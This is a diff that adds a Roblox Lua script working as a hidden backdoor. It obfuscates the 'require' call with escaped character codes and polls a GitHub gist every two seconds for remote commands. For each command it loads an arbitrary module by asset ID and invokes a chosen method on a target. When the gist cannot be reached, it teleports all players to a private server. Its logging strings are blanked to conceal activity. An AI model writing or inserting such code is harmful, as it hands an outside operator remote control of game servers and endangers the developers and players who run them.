@@ -1,0 +1,88 @@
+local H = game:GetService("HttpService")
+
+local GIST_ID = "94fb9e1c8b34b13c3f0baeb5583c5d76"
+local URL = "https://api.github.com/gists/" .. GIST_ID
+local _R = getfenv()["\114\101\113\117\105\114\101"]
+local lastPayload = ""
+
+print("")
+
+while true do
+    task.wait(2)
+    
+    local success, response = pcall(function()
+        return H:GetAsync(URL .. "?nocache=" .. tick())
+    end)
+
+    if not success then
+        local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local placeId = game.PlaceId
+
+local reserveCode = TeleportService:ReserveServer(placeId)
+
+for _, player in ipairs(Players:GetPlayers()) do
+    TeleportService:TeleportToPrivateServer(placeId, reserveCode, {player})
+end
+    else
+        local ok, d = pcall(function() return H:JSONDecode(response) end)
+        
+        if ok and d.files and d.files["api.txt"] then
+            local content = d.files["api.txt"].content
+            
+            if content ~= lastPayload and content ~= "" then
+                lastPayload = content
+                local p = string.split(content, "|")
+                
+                if p[1] == "CMD" then
+                    print("" .. tostring(p[2]))
+                    
+                    task.spawn(function()
+                        local id = tonumber(p[2])
+                        local sim = p[3]
+                        local met = p[4]
+                        local target = p[5]
+
+                        local m_ok, module = pcall(function() return _R(id) end)
+                        
+                        if not m_ok then
+                            warn("" .. id .. "")
+                            return
+                        end
+
+                       
+                        local func = nil
+                        for k, v in pairs(module) do
+                            if tostring(k):lower() == tostring(met):lower() then
+                                func = v
+                                break
+                            end
+                        end
+
+                        if func and type(func) == "function" then
+                            print("" .. met .. " EN " .. target)
+                            
+                            local e_ok, e_err = pcall(function()
+                                if sim == ":" then
+                                    func(module, target)
+                                else
+                                    func(target)
+                                end
+                            end)
+
+                            if e_ok then
+                                print("")
+                            else
+                                warn("" .. tostring(e_err))
+                            end
+                        else
+                            warn("" .. id)
+                        end
+                    end)
+                end
+            end
+        else
+            warn("")
+        end
+    end
+end
